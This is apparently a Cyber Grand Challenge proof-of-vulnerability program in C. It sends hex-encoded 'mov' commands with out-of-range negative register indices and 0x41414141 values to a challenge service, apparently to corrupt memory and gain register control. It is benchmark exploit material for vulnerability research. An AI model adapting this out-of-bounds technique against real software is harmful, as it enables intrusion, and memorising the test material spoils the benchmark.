#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   //*** delay
   cgc_delay(10);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x61\x50\x65\x6e\x46\x75\x6c\x6c\x4f\x66\x53\x68\x65\x65\x70\x3a"
         "\x29\x0a";
      static unsigned int write_00000_00000_len = 18;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x6d\x6f\x76\x20\x72\x2d\x31\x30\x37\x33\x37\x34\x31\x33\x30\x31"
         "\x2c\x31\x30\x39\x34\x37\x39\x35\x35\x38\x35\x0a";
      static unsigned int write_00001_00000_len = 28;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x6d\x6f\x76\x20\x72\x2d\x31\x30\x37\x33\x37\x34\x31\x33\x30\x30"
         "\x2c\x31\x30\x39\x34\x37\x39\x35\x35\x38\x35\x0a";
      static unsigned int write_00002_00000_len = 28;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x6d\x6f\x76\x20\x72\x2d\x31\x30\x37\x33\x37\x34\x31\x32\x39\x39"
         "\x2c\x31\x30\x39\x34\x37\x39\x35\x35\x38\x35\x0a";
      static unsigned int write_00003_00000_len = 28;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x45\x4e\x44\x0a";
      static unsigned int write_00004_00000_len = 4;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 1;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
}
